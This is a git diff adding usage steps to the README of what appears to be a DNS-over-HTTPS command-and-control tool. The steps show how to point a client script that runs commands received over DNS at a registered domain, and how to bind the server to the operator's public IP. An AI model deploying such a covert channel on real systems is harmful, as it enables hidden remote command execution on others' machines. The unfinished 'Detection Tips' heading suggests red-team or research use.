@@ -41,5 +41,27 @@ Follow instructions on the screenshot bellow to setup the NameServer.
 Replace the IP and domainname with your purchased domain
 ![grafik](https://github.com/user-attachments/assets/c9e9f4cf-ac77-4b31-b92d-7bfe28ed93e9)
 
+# Usage
+**1. Client side**  
+
+Make sure to change the bellow in the "doh_client.py" to the domain registered in step 4  
+
+if __name__ == "__main__":
+    domain_name = "send.example.com"  # Replace after '**send**' with your domain
+    execute_command_from_dns(domain_name)
+
+      
+python3 doh_client.py  
+
+**2. Server side**  
+
+Make sure to change the IP in the "doh_server.py"  
+
+class DNSDoHServer:
+    def __init__(self, host='YOURIP', port=53): # Replace with Your public IP
+
+      
+Run: python3 doh_server.py
 
 # Architecture TODO
+# Detection Tips TODO
